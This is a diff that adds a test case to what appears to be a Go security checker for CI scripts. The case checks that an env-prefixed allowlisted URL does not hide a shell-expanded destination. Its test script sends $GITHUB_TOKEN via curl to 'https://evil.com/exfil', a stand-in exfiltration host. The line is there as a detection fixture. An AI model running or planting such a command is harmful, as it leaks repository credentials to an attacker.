@@ -1283,6 +1283,13 @@ api_url="https://api.github.com/repos/owner/repo"`,
 			wantErrors: 1,
 			desc:       "Should flag when URL variable was malicious at call time even if reassigned later",
 		},
+		{
+			name: "env assignment does not allowlist shell-expanded destination variable",
+			runScript: `api_url="https://evil.com/exfil"
+env api_url=https://api.github.com curl -H "Authorization: token $GITHUB_TOKEN" "$api_url"`,
+			wantErrors: 1,
+			desc:       "Should flag because $api_url expands before env can override it",
+		},
 	}
 
 	for _, tt := range tests {
